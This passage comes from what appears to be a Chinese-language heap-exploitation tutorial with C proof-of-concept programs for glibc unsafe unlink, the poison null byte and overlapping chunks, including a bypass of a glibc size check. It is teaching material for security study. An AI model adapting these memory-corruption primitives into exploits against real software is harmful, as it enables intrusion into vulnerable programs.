  <span class="n">chunk2_hdr</span><span class="o">-&gt;</span><span class="n">prev_size</span> <span class="o">=</span> <span class="mh">0x80</span><span class="p">;</span>  <span class="c1">// chunk1&#39;s data region size</span>
  <span class="n">chunk2_hdr</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="mi">1</span><span class="p">;</span>        <span class="c1">// Unsetting prev_in_use bit</span>

  <span class="c1">// Now, when chunk2 is freed, attacker&#39;s fake chunk is &#39;unlinked&#39;</span>
  <span class="c1">// This results in chunk1 pointer pointing to chunk1 - 3</span>
  <span class="c1">// i.e. chunk1[3] now contains chunk1 itself.</span>
  <span class="c1">// We then make chunk1 point to some victim&#39;s data</span>
  <span class="n">free</span><span class="p">(</span><span class="n">chunk2</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">chunk1</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">chunk1</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span>

  <span class="n">chunk1</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span><span class="p">)</span><span class="n">data</span><span class="p">;</span>

  <span class="n">strcpy</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="s">&quot;Victim&#39;s data&quot;</span><span class="p">);</span>

  <span class="c1">// Overwrite victim&#39;s data using chunk1</span>
  <span class="n">chunk1</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x002164656b636168LL</span><span class="p">;</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>

  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>

<p>unlink过程中，会设置</p>
<ol>
<li>Set <code>P-&gt;fd-&gt;bk</code> = <code>P-&gt;bk</code>.</li>
<li>Set <code>P-&gt;bk-&gt;fd</code> = <code>P-&gt;fd</code>.</li>
</ol>
<p>此处 <code>P-&gt;fd-&gt;bk</code> 和 <code>P-&gt;bk-&gt;fd</code> 都指向<code>P</code>，因此只有第二行的语句有效，最终使得</p>
<p>​   <code>P=P-&gt;fd</code></p>
<p>此处P是一个指针，原本指向malloc出来的值，一般是一个栈变量，<code>P-&gt;fd</code>一般指向<code>P-0x8*3</code>的位置也就是<code>P</code>向前数第三个变量，同样也是栈变量。最终也就使得<code>P</code>指向了栈上，从而可以对栈变量进行修改了。</p>
<h2 id="30-poison_null_byte-shrinking-free-chunks-freechunksize">3.0 poison_null_byte / Shrinking Free Chunks / 减少free的chunk的size</h2>
<p>本攻击通过溢出减少已被free掉的chunk的大小，从而使得再下一次分配时，原chunk的所有空间无法被利用完，使得与之后的chunk之间有空隙，那么当之后的chunk被free时，会执行合并操作，把已经被分配的空间合并</p>
<ul>
<li>
<p>条件</p>
<ul>
<li>能够减少已free的chunk的大小，如溢出</li>
</ul>
</li>
</ul>
<ul>
<li>
<p>安全检查</p>
<ul>
<li>被修改大小的chunk的头部新申请的chunk需要已经被free，并且不是fastchunk</li>
<li>被修改大小的chunk <code>P</code>需满足<code>chunksize(P) == prev_size (next_chunk(P))</code></li>
</ul>
</li>
</ul>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;malloc.h&gt;</span><span class="cp"></span>


<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Welcome to poison null byte 2.0!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Tested in Ubuntu 14.04 64bit.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;This technique can be used when you have an off-by-one into a malloc&#39;ed region with a null byte.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>

    <span class="kt">uint8_t</span><span class="o">*</span> <span class="n">a</span><span class="p">;</span>
    <span class="kt">uint8_t</span><span class="o">*</span> <span class="n">b</span><span class="p">;</span>
    <span class="kt">uint8_t</span><span class="o">*</span> <span class="n">c</span><span class="p">;</span>
    <span class="kt">uint8_t</span><span class="o">*</span> <span class="n">b1</span><span class="p">;</span>
    <span class="kt">uint8_t</span><span class="o">*</span> <span class="n">b2</span><span class="p">;</span>
    <span class="kt">uint8_t</span><span class="o">*</span> <span class="n">d</span><span class="p">;</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;We allocate 0x100 bytes for &#39;a&#39;.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">a</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="o">*</span><span class="p">)</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;a: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">real_a_size</span> <span class="o">=</span> <span class="n">malloc_usable_size</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Since we want to overflow &#39;a&#39;, we need to know the &#39;real&#39; size of &#39;a&#39; &quot;</span>
        <span class="s">&quot;(it may be more than 0x100 because of rounding): %#x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">real_a_size</span><span class="p">);</span>

    <span class="cm">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span>
<span class="cm">     * the least significant byte of this will be 0x10, because the size of the chunk includes</span>
<span class="cm">     * the amount requested plus some amount required for the metadata. */</span>
    <span class="n">b</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="o">*</span><span class="p">)</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x200</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;b: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">b</span><span class="p">);</span>

    <span class="n">c</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="o">*</span><span class="p">)</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;c: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">c</span><span class="p">);</span>

    <span class="kt">uint64_t</span><span class="o">*</span> <span class="n">b_size_ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)(</span><span class="n">b</span> <span class="o">-</span> <span class="mi">8</span><span class="p">);</span>

    <span class="c1">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span>
    <span class="c1">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span>
    <span class="c1">// this added check requires we are allowed to have null pointers in b (not just a c string)</span>
    <span class="c1">//*(size_t*)(b+0x1f0) = 0x200;</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;In newer versions of glibc we will need to have our updated size inside b itself to pass &quot;</span>
        <span class="s">&quot;the check &#39;chunksize(P) != prev_size (next_chunk(P))&#39;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="c1">// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)</span>
    <span class="c1">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span>
    <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span><span class="o">*</span><span class="p">)(</span><span class="n">b</span><span class="o">+</span><span class="mh">0x1f0</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x200</span><span class="p">;</span>

    <span class="c1">// this technique works by overwriting the size metadata of a free chunk</span>
    <span class="n">free</span><span class="p">(</span><span class="n">b</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;b.size: %#lx</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">*</span><span class="n">b_size_ptr</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;b.size is: (0x200 + 0x10) | prev_in_use</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;We overflow &#39;a&#39; with a single null byte into the metadata of &#39;b&#39;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">a</span><span class="p">[</span><span class="n">real_a_size</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;b.size: %#lx</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">*</span><span class="n">b_size_ptr</span><span class="p">);</span>

    <span class="kt">uint64_t</span><span class="o">*</span> <span class="n">c_prev_size_ptr</span> <span class="o">=</span> <span class="p">((</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="n">c</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">;</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;c.prev_size is %#lx</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="o">*</span><span class="n">c_prev_size_ptr</span><span class="p">);</span>

    <span class="c1">// This malloc will result in a call to unlink on the chunk where b was.</span>
    <span class="c1">// The added check (commit id: 17f487b), if not properly handled as we did before,</span>
    <span class="c1">// will detect the heap corruption now.</span>
    <span class="c1">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where</span>
    <span class="c1">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)</span>
    <span class="c1">// next_chunk(P) == b-0x10+0x200 == b+0x1f0</span>
    <span class="c1">// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
        <span class="o">*</span><span class="p">((</span><span class="kt">size_t</span><span class="o">*</span><span class="p">)(</span><span class="n">b</span><span class="o">-</span><span class="mh">0x8</span><span class="p">)),</span> <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span><span class="o">*</span><span class="p">)(</span><span class="n">b</span><span class="o">-</span><span class="mh">0x10</span> <span class="o">+</span> <span class="o">*</span><span class="p">((</span><span class="kt">size_t</span><span class="o">*</span><span class="p">)(</span><span class="n">b</span><span class="o">-</span><span class="mh">0x8</span><span class="p">))));</span>
    <span class="n">b1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;b1: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">b1</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Now we malloc &#39;b1&#39;. It will be placed where &#39;b&#39; was. &quot;</span>
        <span class="s">&quot;At this point c.prev_size should have been updated, but it was not: %lx</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="o">*</span><span class="n">c_prev_size_ptr</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &quot;</span>
        <span class="s">&quot;before c.prev_size: %lx</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="o">*</span><span class="p">(((</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="n">c</span><span class="p">)</span><span class="o">-</span><span class="mi">4</span><span class="p">));</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;We malloc &#39;b2&#39;, our &#39;victim&#39; chunk.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="c1">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span>

    <span class="n">b2</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;b2: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">b2</span><span class="p">);</span>

    <span class="n">memset</span><span class="p">(</span><span class="n">b2</span><span class="p">,</span><span class="sc">&#39;B&#39;</span><span class="p">,</span><span class="mh">0x80</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Current b2 content:</span><span class="se">\n</span><span class="s">%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">b2</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Now we free &#39;b1&#39; and &#39;c&#39;: this will consolidate the chunks &#39;b1&#39; and &#39;c&#39; (forgetting about &#39;b2&#39;).</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>

    <span class="n">free</span><span class="p">(</span><span class="n">b1</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">c</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Finally, we allocate &#39;d&#39;, overlapping &#39;b2&#39;.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">d</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x300</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;d: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">d</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Now &#39;d&#39; and &#39;b2&#39; overlap.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">d</span><span class="p">,</span><span class="sc">&#39;D&#39;</span><span class="p">,</span><span class="mh">0x300</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;New b2 content:</span><span class="se">\n</span><span class="s">%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">b2</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Thanks to http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf &quot;</span>
        <span class="s">&quot;for the clear explanation of this technique.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>

<h2 id="31-overlapping-chunks-increasing-used-chunks-chunk">3.1 Overlapping Chunks / Increasing used Chunks / 增加在使用的chunk的大小</h2>
<p>本攻击通过增加正在使用的chunk的大小，使得他的大小覆盖其后面正在使用的chunk，导致free该被修改大小的chunk时将后面正在使用的chunk一并free掉，再下一次malloc会产生地址重叠。</p>
<ul>
<li>条件<ul>
<li>能够修改正在使用的chunk的大小</li>
</ul>
</li>
<li>安全检查<ul>
<li>？？</li>
</ul>
</li>
</ul>
<div class="highlight"><pre><span></span><span class="cm">/*</span>
<span class="cm"> Yet another simple tale of overlapping chunk.</span>

<span class="cm"> This technique is taken from</span>
<span class="cm"> https://loccs.sjtu.edu.cn/wiki/lib/exe/fetch.php?media=gossip:overview:ptmalloc_camera.pdf.</span>

<span class="cm"> This is also referenced as Nonadjacent Free Chunk Consolidation Attack.</span>

<span class="cm">*/</span>

<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;malloc.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>

  <span class="kt">intptr_t</span> <span class="o">*</span><span class="n">p1</span><span class="p">,</span><span class="o">*</span><span class="n">p2</span><span class="p">,</span><span class="o">*</span><span class="n">p3</span><span class="p">,</span><span class="o">*</span><span class="n">p4</span><span class="p">,</span><span class="o">*</span><span class="n">p5</span><span class="p">,</span><span class="o">*</span><span class="n">p6</span><span class="p">;</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">real_size_p1</span><span class="p">,</span><span class="n">real_size_p2</span><span class="p">,</span><span class="n">real_size_p3</span><span class="p">,</span><span class="n">real_size_p4</span><span class="p">,</span><span class="n">real_size_p5</span><span class="p">,</span><span class="n">real_size_p6</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">prev_in_use</span> <span class="o">=</span> <span class="mh">0x1</span><span class="p">;</span>

  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">This is a simple chunks overlapping problem&quot;</span><span class="p">);</span>
  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">This is also referenced as Nonadjacent Free Chunk Consolidation Attack</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">Let&#39;s start to allocate 5 chunks on the heap:&quot;</span><span class="p">);</span>

  <span class="n">p1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
  <span class="n">p2</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
  <span class="n">p3</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
  <span class="n">p4</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
  <span class="n">p5</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>

  <span class="n">real_size_p1</span> <span class="o">=</span> <span class="n">malloc_usable_size</span><span class="p">(</span><span class="n">p1</span><span class="p">);</span>
  <span class="n">real_size_p2</span> <span class="o">=</span> <span class="n">malloc_usable_size</span><span class="p">(</span><span class="n">p2</span><span class="p">);</span>
  <span class="n">real_size_p3</span> <span class="o">=</span> <span class="n">malloc_usable_size</span><span class="p">(</span><span class="n">p3</span><span class="p">);</span>
  <span class="n">real_size_p4</span> <span class="o">=</span> <span class="n">malloc_usable_size</span><span class="p">(</span><span class="n">p4</span><span class="p">);</span>
  <span class="n">real_size_p5</span> <span class="o">=</span> <span class="n">malloc_usable_size</span><span class="p">(</span><span class="n">p5</span><span class="p">);</span>

  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\n\n</span><span class="s">chunk p1 from %p to %p&quot;</span><span class="p">,</span> <span class="n">p1</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">p1</span><span class="o">+</span><span class="n">malloc_usable_size</span><span class="p">(</span><span class="n">p1</span><span class="p">));</span>
  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">chunk p2 from %p to %p&quot;</span><span class="p">,</span> <span class="n">p2</span><span class="p">,</span>  <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">p2</span><span class="o">+</span><span class="n">malloc_usable_size</span><span class="p">(</span><span class="n">p2</span><span class="p">));</span>
  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">chunk p3 from %p to %p&quot;</span><span class="p">,</span> <span class="n">p3</span><span class="p">,</span>  <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">p3</span><span class="o">+</span><span class="n">malloc_usable_size</span><span class="p">(</span><span class="n">p3</span><span class="p">));</span>
  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">chunk p4 from %p to %p&quot;</span><span class="p">,</span> <span class="n">p4</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">p4</span><span class="o">+</span><span class="n">malloc_usable_size</span><span class="p">(</span><span class="n">p4</span><span class="p">));</span>
  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">chunk p5 from %p to %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">p5</span><span class="p">,</span>  <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">p5</span><span class="o">+</span><span class="n">malloc_usable_size</span><span class="p">(</span><span class="n">p5</span><span class="p">));</span>

  <span class="n">memset</span><span class="p">(</span><span class="n">p1</span><span class="p">,</span><span class="sc">&#39;A&#39;</span><span class="p">,</span><span class="n">real_size_p1</span><span class="p">);</span>
  <span class="n">memset</span><span class="p">(</span><span class="n">p2</span><span class="p">,</span><span class="sc">&#39;B&#39;</span><span class="p">,</span><span class="n">real_size_p2</span><span class="p">);</span>
  <span class="n">memset</span><span class="p">(</span><span class="n">p3</span><span class="p">,</span><span class="sc">&#39;C&#39;</span><span class="p">,</span><span class="n">real_size_p3</span><span class="p">);</span>
  <span class="n">memset</span><span class="p">(</span><span class="n">p4</span><span class="p">,</span><span class="sc">&#39;D&#39;</span><span class="p">,</span><span class="n">real_size_p4</span><span class="p">);</span>
  <span class="n">memset</span><span class="p">(</span><span class="n">p5</span><span class="p">,</span><span class="sc">&#39;E&#39;</span><span class="p">,</span><span class="n">real_size_p5</span><span class="p">);</span>

  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">Let&#39;s free the chunk p4.</span><span class="se">\n</span><span class="s">In this case this isn&#39;t coealesced with top chunk since we have p5 bordering top chunk after p4</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span> 

  <span class="n">free</span><span class="p">(</span><span class="n">p4</span><span class="p">);</span>

  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">Let&#39;s trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2</span><span class="se">\n</span><span class="s">with the size of chunk_p2 + size of chunk_p3</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>

  <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">p1</span> <span class="o">+</span> <span class="n">real_size_p1</span> <span class="p">)</span> <span class="o">=</span> <span class="n">real_size_p2</span> <span class="o">+</span> <span class="n">real_size_p3</span> <span class="o">+</span> <span class="n">prev_in_use</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">size_t</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span><span class="p">;</span> <span class="c1">//&lt;--- BUG HERE </span>

  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">Now during the free() operation on p2, the allocator is fooled to think that </span><span class="se">\n</span><span class="s">the nextchunk is p4 ( since p2 + size_p2 now point to p4 ) </span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">This operation will basically create a big free chunk that wrongly includes p3</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="n">free</span><span class="p">(</span><span class="n">p2</span><span class="p">);</span>

  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">Now let&#39;s allocate a new chunk with a size that can be satisfied by the previously freed chunk</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>

  <span class="n">p6</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">2000</span><span class="p">);</span>
  <span class="n">real_size_p6</span> <span class="o">=</span> <span class="n">malloc_usable_size</span><span class="p">(</span><span class="n">p6</span><span class="p">);</span>

  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">Our malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and </span><span class="se">\n</span><span class="s">we can overwrite data in p3 by writing on chunk p6</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">chunk p6 from %p to %p&quot;</span><span class="p">,</span> <span class="n">p6</span><span class="p">,</span>  <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">p6</span><span class="o">+</span><span class="n">real_size_p6</span><span class="p">);</span>
  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">chunk p3 from %p to %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">p3</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">p3</span><span class="o">+</span><span class="n">real_size_p3</span><span class="p">);</span> 

  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">Data inside chunk p3: </span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">p3</span><span class="p">);</span> 

  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">Let&#39;s write something inside p6</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="n">memset</span><span class="p">(</span><span class="n">p6</span><span class="p">,</span><span class="sc">&#39;F&#39;</span><span class="p">,</span><span class="mi">1500</span><span class="p">);</span>  

  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">Data inside chunk p3: </span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">p3</span><span class="p">);</span> 


<span class="p">}</span>
</pre></div>

<h2 id="32-overlapping-chunks-increase-free-chunks-free-chunk">3.2 Overlapping Chunks / Increase free chunks / 增加free chunk大小</h2>
